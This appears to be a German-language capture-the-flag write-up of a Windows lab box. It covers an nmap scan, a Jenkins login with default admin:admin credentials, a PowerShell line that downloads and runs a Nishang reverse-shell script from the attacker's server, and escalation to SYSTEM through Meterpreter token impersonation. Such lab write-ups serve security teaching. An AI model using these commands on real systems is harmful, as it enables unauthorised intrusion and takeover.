Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).


# Ziel: 10.10.2.172

# Initial Access
## Scanning 

Nmap 
80/tcp   open  http           Microsoft IIS httpd 7.5
3389/tcp open   ms-wbt-server?
8080/tcp open  http           Jetty 9.4.z-SNAPSHOT


## Exploiting 
Login Page für Jenkins unter 10.10.38.83:8080 gefunden

Test von Default user&Passwort 
admin:admin
->  Erfolgreicher login

von THM Kommentar 

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.242.69:8000/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.242.69 -Port 4444
```

->  Rev Shell anbieten auf eigenen http server
->  Feature finden um die Shell auf dem ziel zu laden
-> Rev Shell mit NC fangen

Shell auf http Server anbieten: 

```
python3 -m http.server
```

-> webserver auf localip:8000

http://10.10.242.69:8000/Invoke-PowershellTcp.ps1

-> Upload Möglichkeit via Project Configure gefunden ->  Auch Ausführung möglich
->  Rev Shell erhalten
-> User alfred\bruce


# Priv Escalation

Hier wird vorgegeben das wir token impersination nutzen werden

Zuerst gilt  es hier zu schauen welche Berechtigungen wir haben via: 

```
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

```

Hier intressant zu sehen sind die beiden 'SeDebugPrivilege, SeImpersonatePrivilege)'.  Durch SeImpersonatePrivilige können wir unsere rechte potenziell erweitern. Jetzt gilt es zu schauen welche User Tokens für uns zur Verfügung stehen. (der Einfachkeit halber hanbe ich auf eine Merterpreter shell in Metasploit gewechselt.)

```
meterpreter > list_tokens -g


[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available

```

Hier sehen wir das wir u.A. den "BUILTIN\Administrators" token haben. diesen nutzen wir jetzt um Admin rechte zu erhalten. Zuerst laden wir hier dafür das Meterpreter Modul "incognito"

```
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

wie wir nach der Kontroller mit "getuid" sehen sind wir erfolgreich von den Rechten aufggestiegen.